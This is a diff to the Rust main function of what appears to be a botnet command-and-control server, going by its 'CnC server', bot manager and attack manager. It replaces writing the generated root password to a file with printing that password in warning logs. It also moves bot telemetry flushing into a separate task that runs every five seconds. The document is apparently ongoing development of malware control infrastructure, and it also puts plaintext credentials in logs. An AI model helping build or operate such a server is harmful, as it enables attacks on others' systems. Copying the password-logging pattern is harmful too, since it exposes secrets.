@@ -142,21 +142,12 @@ async fn main() -> Result<()> {
             Level::Owner,
         ).await {
             Ok(_) => {
-                // Write credentials to file securely
-                let creds_path = config_dir.join("root_credentials.txt");
-                let creds_content = format!(
-                    "ROOT CREDENTIALS - GENERATED AT {}\n\nUsername: root\nPassword: {}\n\nKEEP THIS FILE SECURE AND DELETE AFTER USE!", 
-                    chrono::Utc::now(),
-                    password
-                );
-                
-                if let Err(e) = tokio::fs::write(&creds_path, creds_content).await {
-                    error!("Failed to write root credentials to file: {}", e);
-                    // Fallback to stdout if file write fails, but warn heavily
-                    warn!("CRITICAL: Could not write root_credentials.txt. Password: {}", password);
-                } else {
-                    info!("✓ Root user created. Credentials saved to: {}", creds_path.display());
-                }
+                warn!("=================================================================");
+                warn!("🔐 ROOT ACCOUNT CREATED");
+                warn!("Username: root");
+                warn!("Password: {}", password);
+                warn!("SAVE THIS PASSWORD NOW! IT WILL NOT BE SHOWN AGAIN.");
+                warn!("=================================================================");
             },
             Err(e) => error!("Failed to create root user: {}", e),
         }
@@ -194,6 +185,16 @@ async fn main() -> Result<()> {
     let state_clone = state.clone();
     tokio::spawn(async move {
         periodic_cleanup(state_clone).await;
+    });
+
+    // Start telemetry flush task (High frequency)
+    let state_clone = state.clone();
+    tokio::spawn(async move {
+        let mut interval = tokio::time::interval(Duration::from_secs(5));
+        loop {
+            interval.tick().await;
+            state_clone.bot_manager.flush_telemetry().await;
+        }
     });
     
     // Start CnC server
@@ -322,8 +323,7 @@ async fn periodic_cleanup(state: Arc<AppState>) {
     loop {
         interval.tick().await;
         
-        // Flush telemetry buffer
-        state.bot_manager.flush_telemetry().await;
+        // Telemetry is flushed in a separate task now
 
         // Cleanup finished attacks
         state.attack_manager.cleanup_finished().await;
